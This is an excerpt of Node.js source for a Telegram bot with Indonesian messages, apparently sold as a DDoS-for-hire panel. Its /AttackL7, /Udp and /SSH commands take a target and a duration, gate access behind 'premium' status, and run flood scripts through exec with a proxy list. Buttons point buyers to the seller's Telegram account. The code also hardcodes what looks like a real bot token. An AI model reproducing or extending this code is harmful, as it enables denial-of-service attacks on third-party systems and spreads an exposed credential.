...
const token = '7973438773:AAFmaHQvOUkyTdiYcdU5JUR0WUsw77KnwI8';
...
bot.onText(/^\/AttackL7(?: (.+) (.+))?$/, (msg, match) => {
  ...
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin mendapatkan premium maka chat owner @Dimzxzzx');
    return;
  }
...
bot.onText(/^\/Udp(?: (.+) (.+))?$/, (msg, match) => {
  ...
  const process = exec(`node Udp.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
...
bot.onText(/^\/SSH(?: (.+) (.+))?$/, (msg, match) => {
  ...
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Dimzxzx');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
  ...
  bot.sendMessage(chatId, "Mau Beli Script SC ini?\nKlik Button Di Bawah Untuk Menghubungi Developer Bot\n\nNote : Jangan Spamm!!",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Buy Script', url: `https://t.me/Dimzxzzx` }
          ]
        ]
      },
      parse_mode: "Markdown"
  ...
  bot.sendMessage(chatId, "Haii Kak, Bot Online ( Aktif ), Jika Bot Off Mungkin Sedaang ada eror dipanel mohon cek dipanel yaa",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Zamss-XcV', url: `https://t.me/Dimzxzzx` }
          ]
        ]
      },
      parse_mode: "Markdown"
...
bot.onText(/\/owner/, (msg) => {
      ...
      const buttons = [
        {
          text: 'tiktok',
          url: 'https://tiktok.com/Dimzxzz.id'
        },
        {
          text: 'Telegram',
          url: 'https://t.me/Dimzxzzx'
        },
        {
          text: 'CH CYBER JATENG',
          url: 'https://t.me/cyberjawatengah'
        }
      ];
